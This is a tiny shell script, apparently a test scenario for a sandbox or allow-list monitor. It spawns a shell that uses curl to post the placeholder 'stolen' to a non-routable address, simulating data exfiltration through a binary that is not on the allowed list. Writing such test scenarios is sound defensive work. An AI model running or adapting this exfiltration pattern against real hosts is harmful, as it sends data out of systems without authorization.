#!/bin/sh
# Scenario 1 — shell exec
# Spawn a shell that runs a binary not in the allowed list.
echo "[attack] spawning shell payload"
sh -c 'curl -m 5 http://10.255.255.1 -d stolen || true'
echo "[attack] shell returned"
